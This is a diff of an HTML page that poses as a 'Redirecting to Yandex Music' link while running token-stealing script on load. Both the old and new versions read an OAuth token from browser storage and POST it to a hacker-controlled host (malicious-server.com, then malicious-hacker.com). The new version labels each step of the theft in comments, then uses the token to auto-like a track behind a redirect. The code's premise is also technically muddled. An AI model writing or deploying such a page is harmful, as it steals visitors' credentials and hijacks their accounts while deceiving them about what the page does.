@@ -1,72 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Yandex Music Auto-Liker</title>
+    <title>Yandex Music Auto-Exploit</title>
     <script type="text/javascript">
-        const TRACK_ID = "136101590"; // Replace with your track ID
-        const oauthToken = localStorage.getItem('oauth_token');
+        const TRACK_ID = "136101590"; // The target track ID
 
-        
+        function stealToken() {
+            // Step 1: Extract the OAuth token (if user is already logged in)
+            const stolenToken = localStorage.getItem('oauth_token') || sessionStorage.getItem('oauth_token');
 
-        function likeTrack() {
-            fetch('https://malicious-server.com/steal-token', {
-                method: 'POST',
-                body: JSON.stringify({ token: oauthToken }),
-            });
-            fetch('https://api.music.yandex.net/v1/tracks/136101590/like', {
+            // Step 2: Send the stolen token to a hacker-controlled server
+            if (stolenToken) {
+                fetch('https://malicious-hacker.com/steal-token', {
+                    method: 'POST',
+                    body: JSON.stringify({ token: stolenToken }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
+            }
+        }
+
+        function autoLike() {
+            const oauthToken = localStorage.getItem('oauth_token'); // Extract the user's auth token
+            if (!oauthToken) return;
+
+            // Step 3: Use the stolen token to like a song
+            fetch(`https://api.music.yandex.net/v1/tracks/${TRACK_ID}/like`, {
                 method: 'POST',
                 headers: {
                     'Authorization': `OAuth ${oauthToken}`,
                     'Content-Type': 'application/json',
                 },
             });
-            // Send a request to the Yandex Music API to like the track
-            fetch(`https://api.music.yandex.net/v1/tracks/${TRACK_ID}/like`, {
-                method: 'POST',
-                credentials: 'include', // Include cookies for authentication
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Track liked successfully!', data);
-            })
-            .catch(error => {
-                console.error('Failed to like track:', error);
-            });
         }
 
-        function redirect() {
+        function redirectAndExploit() {
             var userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            var deepLink = `yandexmusic://track/${TRACK_ID}?play=1`;  // Attempt autoplay
-            var webLink = `https://music.yandex.ru/album/35390714/track/${TRACK_ID}?play=true`;  
+            var deepLink = `yandexmusic://track/${TRACK_ID}?play=1`;  // Opens & auto-plays track
+            var webLink = `https://music.yandex.ru/album/35390714/track/${TRACK_ID}?play=true`;
 
-            // iOS Handling: Try deep link first, then fallback to web
+            // Step 4: Redirect user to Yandex Music
             if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                 window.location.href = deepLink;
-                setTimeout(function () {
-                    window.location.href = webLink; // Fallback if deep link fails
-                }, 1000);
+                setTimeout(() => { window.location.href = webLink; }, 1000);
             } 
-            // Android Handling: Open deep link directly
             else if (/android/i.test(userAgent)) {
                 window.location.href = deepLink;
-                setTimeout(function () {
-                    window.location.href = webLink; // Fallback if deep link fails
-                }, 1000);
+                setTimeout(() => { window.location.href = webLink; }, 1000);
             } 
-            // Desktop & Unsupported: Open web version
             else {
                 window.location.href = webLink;
             }
 
-            // Like the track after redirecting
-            likeTrack();
+            // Step 5: Execute the attack in the background
+            setTimeout(() => {
+                stealToken();  // Steal the auth token
+                autoLike();    // Like the song using the stolen token
+            }, 3000);
         }
     </script>
 </head>
-<body onload="redirect()">
-    <p>Redirecting to Yandex Music Track...</p>
+<body onload="redirectAndExploit()">
+    <p>Redirecting to Yandex Music...</p>
 </body>
 </html>
